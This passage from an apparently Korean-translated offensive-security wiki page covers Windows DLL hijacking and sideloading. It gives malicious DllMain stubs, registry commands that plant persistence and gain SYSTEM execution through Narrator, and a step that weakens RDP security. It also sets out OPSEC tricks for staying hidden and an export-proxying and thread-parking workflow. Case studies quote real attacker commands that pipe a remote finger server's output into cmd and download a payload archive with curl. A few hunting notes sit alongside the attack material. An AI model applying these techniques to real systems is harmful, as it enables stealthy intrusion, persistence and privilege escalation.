- Legacy path (이전 빌드): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- OneCore path에 쓰기 가능한 attacker-controlled DLL이 존재하면 해당 DLL이 로드되고 `DllMain(DLL_PROCESS_ATTACH)`가 실행됩니다. export는 필요하지 않습니다.

Procmon을 사용한 Discovery
- Filter: `Process Name is Narrator.exe` 및 `Operation is Load Image` 또는 `CreateFile`.
- Narrator를 시작하고 위 path의 load 시도를 확인합니다.

최소 DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC 무음
- 단순한 hijack은 UI에서 말하거나 강조 표시를 발생시킵니다. 조용히 유지하려면 attach 시 Narrator threads를 열거하고, main thread를 (`OpenThread(THREAD_SUSPEND_RESUME)`) 연 다음 `SuspendThread`로 일시 중지합니다. 자체 thread에서 계속 실행합니다. 전체 코드는 PoC를 참조하세요.<sup>[[8]](#references)</sup>

Accessibility configuration을 통한 Trigger 및 persistence
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 위 설정을 사용하면 Narrator를 시작할 때 planted DLL이 로드됩니다. secure desktop (logon screen)에서 CTRL+WIN+ENTER를 눌러 Narrator를 시작하면 DLL이 secure desktop에서 SYSTEM 권한으로 실행됩니다.

RDP-triggered SYSTEM execution (lateral movement)
- classic RDP security layer 허용: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- host에 RDP로 연결한 후 logon screen에서 CTRL+WIN+ENTER를 눌러 Narrator를 실행하면 DLL이 secure desktop에서 SYSTEM 권한으로 실행됩니다.
- RDP session이 종료되면 실행이 중지되므로 즉시 inject/migrate해야 합니다.

Bring Your Own Accessibility (BYOA)
- 기본 제공 Accessibility Tool (AT)의 registry entry(예: CursorIndicator)를 clone하고, 임의의 binary/DLL을 가리키도록 수정한 뒤 import할 수 있습니다. 그런 다음 `configuration`을 해당 AT 이름으로 설정합니다. 이를 통해 Accessibility framework에서 임의의 execution을 proxy할 수 있습니다.

Notes
- `%windir%\System32` 아래에 쓰거나 HKLM 값을 변경하려면 admin rights가 필요합니다.
- 모든 payload logic은 `DLL_PROCESS_ATTACH`에 포함할 수 있으며, exports는 필요하지 않습니다.

## Case Study: CVE-2025-1729 - TPQMAssistant.exe를 사용한 Privilege Escalation

이 case는 Lenovo의 TrackPoint Quick Menu(`TPQMAssistant.exe`)에서 발생하는 **Phantom DLL Hijacking**을 보여 주며, **CVE-2025-1729**로 추적됩니다.<sup>[[2]](#references)[[3]](#references)</sup>

### Vulnerability Details

- **Component**: `C:\ProgramData\Lenovo\TPQM\Assistant\`에 위치한 `TPQMAssistant.exe`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask`가 매일 오전 9시 30분에 logged-on user의 context에서 실행됩니다.
- **Directory Permissions**: `CREATOR OWNER`가 쓰기 가능하므로 local users가 arbitrary files를 drop할 수 있습니다.
- **DLL Search Behavior**: 먼저 working directory에서 `hostfxr.dll`을 load하려고 시도하며, 파일이 없으면 "NAME NOT FOUND"를 log합니다. 이는 local directory search precedence를 나타냅니다.

### Exploit Implementation

공격자는 동일한 directory에 malicious `hostfxr.dll` stub을 배치하여, missing DLL을 exploit하고 user context에서 code execution을 달성할 수 있습니다:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### 공격 흐름

1. 일반 사용자로서 `hostfxr.dll`을 `C:\ProgramData\Lenovo\TPQM\Assistant\`에 드롭합니다.
2. 현재 사용자 컨텍스트에서 예약된 작업이 오전 9시 30분에 실행될 때까지 기다립니다.
3. 작업이 실행될 때 관리자가 로그인되어 있으면 악성 DLL이 중간 무결성 수준으로 관리자 세션에서 실행됩니다.
4. 표준 UAC bypass techniques를 연계하여 중간 무결성에서 SYSTEM 권한으로 상승합니다.

## 사례 연구: MSI CustomAction Dropper + 서명된 Host를 통한 DLL Side-Loading (wsc_proxy.exe)

Threat actors는 신뢰할 수 있는 서명된 프로세스에서 payload를 실행하기 위해 MSI 기반 droppers와 DLL side-loading을 자주 결합합니다.<sup>[[10]](#references)</sup>

체인 개요
- 사용자가 MSI를 다운로드합니다. GUI 설치 중 CustomAction이 자동으로 실행되며(예: LaunchApplication 또는 VBScript action), embedded resources에서 다음 단계를 재구성합니다.
- Dropper가 정상적으로 서명된 EXE와 악성 DLL을 동일한 디렉터리에 기록합니다(예시 pair: Avast 서명의 wsc_proxy.exe + 공격자가 제어하는 wsc.dll).
- 서명된 EXE가 시작되면 Windows DLL search order에 따라 working directory의 wsc.dll이 먼저 로드되어, 서명된 parent 하에서 공격자 code가 실행됩니다(ATT&CK T1574.001).

MSI 분석(확인할 항목)
- CustomAction table:
- executable 또는 VBScript를 실행하는 entries를 찾습니다. 의심스러운 pattern의 예: background에서 embedded file을 실행하는 LaunchApplication.
- Orca(Microsoft Orca.exe)에서 CustomAction, InstallExecuteSequence 및 Binary tables를 검사합니다.
- MSI CAB의 embedded/split payloads:
- 관리자 권한으로 추출: msiexec /a package.msi /qb TARGETDIR=C:\out
- 또는 lessmsi 사용: lessmsi x package.msi C:\out
- VBScript CustomAction이 여러 개의 작은 fragments를 연결하고 decrypt하는지 확인합니다. 일반적인 흐름:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- 다음 두 파일을 동일한 폴더에 배치합니다.
- wsc_proxy.exe: 합법적으로 서명된 host(Avast)입니다. 이 process는 해당 디렉터리에서 이름으로 wsc.dll을 load하려고 시도합니다.
- wsc.dll: attacker DLL입니다. 특정 exports가 필요하지 않다면 DllMain만으로 충분할 수 있습니다. 그렇지 않다면 proxy DLL을 build하고, payload를 DllMain에서 실행하면서 필요한 exports를 genuine library로 forward합니다.
- 최소한의 DLL payload를 build합니다:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- export requirements의 경우, proxying framework (예: DLLirant/Spartacus)를 사용해 payload도 실행하는 forwarding DLL을 생성합니다.

- 이 technique은 host binary의 DLL name resolution에 의존합니다. host가 absolute path 또는 safe loading flag (예: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories)를 사용하면 hijack이 실패할 수 있습니다.
- KnownDLLs, SxS 및 forwarded export가 우선순위에 영향을 줄 수 있으므로 host binary와 export set을 선택할 때 고려해야 합니다.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point는 Ink Dragon이 디스크에 core payload를 encrypted 상태로 유지하면서 legitimate software에 섞이도록 **three-file triad**를 사용해 ShadowPad를 배포하는 방식을 설명했습니다:<sup>[[12]](#references)</sup>

1. **Signed host EXE** – AMD, Realtek 또는 NVIDIA와 같은 vendor가 악용됩니다 (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). attackers는 executable을 Windows binary처럼 보이도록 이름을 변경합니다 (예: `conhost.exe`). 하지만 Authenticode signature는 유효한 상태로 유지됩니다.
2. **Malicious loader DLL** – 예상되는 이름으로 EXE 옆에 배치됩니다 (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL은 일반적으로 ScatterBrain framework로 obfuscate된 MFC binary이며, encrypted blob을 찾고 decrypt한 뒤 ShadowPad를 reflectively map하는 작업만 수행합니다.
3. **Encrypted payload blob** – 같은 directory에 `<name>.tmp`로 저장되는 경우가 많습니다. decrypted payload를 memory-map한 후 loader는 forensic evidence를 제거하기 위해 TMP file을 삭제합니다.

Tradecraft 참고 사항:

* Signed EXE의 이름을 변경하면서 PE header에 있는 기존 `OriginalFileName`을 유지하면 Windows binary로 위장하면서 vendor signature를 유지할 수 있습니다. 따라서 Ink Dragon이 실제로는 AMD/NVIDIA utility인 `conhost.exe` 형태의 binary를 배포하는 방식을 재현합니다.
* Executable이 trusted 상태로 유지되므로 대부분의 allowlisting control에서는 malicious DLL을 executable 옆에 두기만 하면 됩니다. Loader DLL을 custom하는 데 집중하고, signed parent는 일반적으로 수정 없이 실행할 수 있습니다.
* ShadowPad decryptor는 TMP blob이 loader 옆에 있고 writable 상태이기를 요구하며, mapping 후 file을 zero할 수 있어야 합니다. payload가 load될 때까지 directory를 writable 상태로 유지합니다. 메모리에 올라간 후에는 OPSEC를 위해 TMP file을 안전하게 삭제할 수 있습니다.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators는 DLL sideloading을 LOLBAS와 결합하여 디스크에 저장되는 유일한 custom artifact가 trusted EXE 옆의 malicious DLL이 되도록 합니다:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Hidden PowerShell이 `cmd.exe /c`를 spawn하고, Finger server에서 commands를 가져와 `cmd`로 pipe합니다:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host`는 TCP/79 text를 가져오며, `| cmd`는 server response를 execute하므로 operators가 second stage server를 server-side에서 교체할 수 있습니다.

- **Built-in download/extract:** benign extension을 사용해 archive를 download하고, 압축을 풀어 random `%LocalAppData%` folder 아래에 sideload target과 DLL을 stage합니다:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L`은 progress를 숨기고 redirect를 따릅니다. `tar -xf`는 Windows에 내장된 tar를 사용합니다.

- **WMI/CIM launch:** WMI를 통해 EXE를 시작하면 telemetry에는 CIM이 생성한 process로 표시되며, EXE는 옆에 배치된 DLL을 load합니다:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- local DLL을 우선하는 binary (예: `intelbq.exe`, `nearby_share.exe`)에서 작동하며, payload (예: Remcos)는 trusted name으로 실행됩니다.

- **Hunting:** `/p`, `/m`, `/c`가 함께 나타나는 `forfiles`에 alert를 생성합니다. 이는 admin script 외부에서는 흔하지 않습니다.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

최근 Lotus Blossom intrusion은 trusted update chain을 악용해 NSIS-packed dropper를 전달했습니다. 이 dropper는 DLL sideload와 fully in-memory payload를 stage했습니다.<sup>[[13]](#references)</sup>

Tradecraft 흐름
- `update.exe` (NSIS)는 `%AppData%\Bluetooth`를 생성하고 **HIDDEN**으로 표시한 뒤, 이름을 변경한 Bitdefender Submission Wizard `BluetoothService.exe`, malicious `log.dll` 및 encrypted blob `BluetoothService`를 drop하고 EXE를 launch합니다.
- host EXE는 `log.dll`을 import하고 `LogInit`/`LogWrite`를 호출합니다. `LogInit`은 blob을 mmap-load합니다. `LogWrite`는 custom LCG-based stream (constants **0x19660D** / **0x3C6EF35F**, 이전 hash에서 파생된 key material)을 사용해 이를 decrypt하고, buffer를 plaintext shellcode로 overwrite하며, temporary data를 free한 뒤 shellcode로 jump합니다.
- IAT를 사용하지 않기 위해 loader는 **FNV-1a basis 0x811C9DC5 + prime 0x100019**를 사용해 export name을 hashing한 다음 Murmur-style avalanche (**0x85EBCA6B**)를 적용하고 salted target hash와 비교하여 API를 resolve합니다.

Main shellcode (Chrysalis)
- 다섯 번의 pass에 걸쳐 key `gQ2JR&9;`를 사용해 add/XOR/sub를 반복하여 PE-like main module을 decrypt한 다음, `Kernel32.dll` → `GetProcAddress`를 동적으로 load해 import resolution을 완료합니다.
- per-character bit-rotate/XOR transform을 사용해 runtime에 DLL name string을 reconstruct한 다음 `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`를 load합니다.
- 두 번째 resolver는 **PEB → InMemoryOrderModuleList**를 순회하고, 각 export table을 Murmur-style mixing을 사용해 4-byte block 단위로 parse합니다. hash를 찾지 못한 경우에만 `GetProcAddress`로 fallback합니다.

Embedded configuration & C2
- Config는 drop된 `BluetoothService` file의 **offset 0x30808** (size **0x980**)에 있으며, key `qwhvb^435h&*7`로 RC4-decrypt되어 C2 URL과 User-Agent를 노출합니다.
- Beacon은 dot-delimited host profile을 build하고 tag `4Q`를 prepend한 다음, key `vAuig34%^325hGV`로 RC4-encrypt하여 HTTPS를 통해 `HttpSendRequestA`로 전송합니다. Responses는 RC4-decrypt되고 tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases)에 따라 dispatch됩니다.
- Execution mode는 CLI args로 제어됩니다. args가 없으면 `-i`를 가리키는 persistence (service/Run key)를 install하고, `-i`는 자신을 `-k`와 함께 relaunch하며, `-k`는 install을 건너뛰고 payload를 실행합니다.

Alternate loader observed
- 동일한 intrusion에서 Tiny C Compiler를 drop하고 `C:\ProgramData\USOShared\`에서 `svchost.exe -nostdlib -run conf.c`를 실행했으며, `libtcc.dll`을 옆에 배치했습니다. attacker가 제공한 C source에는 shellcode가 embedded되어 있었고, PE를 디스크에 기록하지 않은 채 compile한 뒤 in-memory로 실행했습니다. 다음으로 재현할 수 있습니다:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- 이 TCC 기반 compile-and-run 단계는 런타임에 `Wininet.dll`을 import하고 하드코딩된 URL에서 second-stage shellcode를 가져와, compiler 실행으로 위장하는 유연한 loader를 제공했습니다.

## Signed-host sideloading with export proxying + host thread parking

일부 DLL sideloading chain은 악성 DLL이 로드된 후 충돌하는 대신, legitimate host가 이후 stage를 안정적으로 로드할 수 있을 만큼 오래 실행되도록 **stability engineering**을 추가합니다.<sup>[[11]](#references)</sup>

Observed pattern
- 예상 dependency 이름인 `version.dll` 등을 사용해 trusted EXE를 malicious DLL과 함께 배치합니다.
- malicious DLL은 **모든 예상 export를** 실제 system DLL(예: `%SystemRoot%\\System32\\version.dll`)로 proxy하여 import resolution이 성공하고 host process가 계속 작동하도록 합니다.
- 로드된 후 malicious DLL은 **host entry point를 patch**하여 main thread가 종료되거나 process를 종료시키는 code path를 실행하는 대신 무한 `Sleep` loop에 빠지게 합니다.
- 새 thread가 실제 malicious 작업을 수행합니다. 즉, next-stage DLL 이름 또는 path를 decrypt(RC4/XOR가 일반적)한 다음 `LoadLibrary`로 실행합니다.

Why this matters
- 일반적인 DLL proxying은 API compatibility를 유지하지만, 이후 stage를 실행할 만큼 host가 오래 살아 있도록 보장하지는 않습니다.
- main thread를 `Sleep(INFINITE)`에 parking하는 것은 loader가 worker thread에서 decryption, staging 또는 network bootstrap을 수행하는 동안 signed process를 resident 상태로 유지하는 간단한 방법입니다.
- 의심스러운 `DllMain`만 hunting하면 이 pattern을 놓칠 수 있습니다. 실제로 흥미로운 동작은 host entry point가 patch되고 secondary thread가 시작된 후에 발생하기 때문입니다.

Minimal workflow
1. signed host EXE를 복사하고 local directory에서 resolve하는 DLL을 확인합니다.
2. 동일한 function을 export하고 이를 legitimate DLL로 forwarding하는 proxy DLL을 build합니다.
3. `DllMain(DLL_PROCESS_ATTACH)`에서 worker thread를 생성합니다.
4. 해당 thread에서 host entry point 또는 main thread start routine을 patch하여 `Sleep` loop를 실행하게 합니다.
5. next-stage DLL 이름/config를 decrypt하고 `LoadLibrary`를 호출하거나 payload를 manual-map합니다.

Defensive pivots
- `System32` 대신 자체 application directory에서 `version.dll` 또는 유사한 common library를 로드하는 signed process.
- image load 직후 process entry point에서 발생하는 memory patch, 특히 `Sleep`/`SleepEx`로 redirect되는 jump/call.
- proxy DLL이 생성한 thread가 decrypt된 이름을 가진 second DLL에 즉시 `LoadLibrary`를 호출하는 경우.
- `ProgramData`, `%TEMP%` 또는 unpacked archive path와 같은 writable staging directory에서 vendor executable 옆에 배치된 full-export proxy DLL.

## References

- [1] [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - TPQMAssistant.exe를 사용한 Privilege Escalation](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – Windows의 DLL hijacking. 간단한 C 예제.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore, Europe를 대상으로 하는 새로운 malware 배포](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: DLL Hijacks와 Windows Helpers의 만남](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digital Doppelgangers: Gh0st RAT를 배포하는 evolving impersonation campaigns의 구조](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Converging Interests: Southeast Asian government를 targeting하는 threat clusters 분석](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Inside Ink Dragon: stealthy offensive operation의 relay network와 내부 동작 분석](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – The Chrysalis Backdoor: Lotus Blossom toolkit 심층 분석](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Iranian APT Screening Serpens의 2026 espionage campaigns 추적](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` 요소](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` 요소](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` 요소](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` 요소](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` 요소](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` 요소](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: Iranian Conflict 중 Nimbus Manticore operations](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062, Southeast Asian governments와 critical infrastructure를 targeting](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
